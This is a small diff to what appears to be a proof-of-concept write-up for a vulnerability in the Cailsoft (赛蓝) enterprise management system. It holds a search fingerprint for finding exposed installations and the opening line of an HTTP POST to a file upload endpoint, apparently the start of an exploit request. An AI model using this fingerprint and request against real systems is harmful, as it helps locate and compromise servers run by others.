@@ -8,7 +8,7 @@
 body="www.cailsoft.com" || body="赛蓝企业管理系统"
 ```
 
-## poc
+## POC
 
 ```xml
 POST /EHRModule/EHR_Holidays/SubmitUploadify?FolderId=1&UserId=1 HTTP/1.1
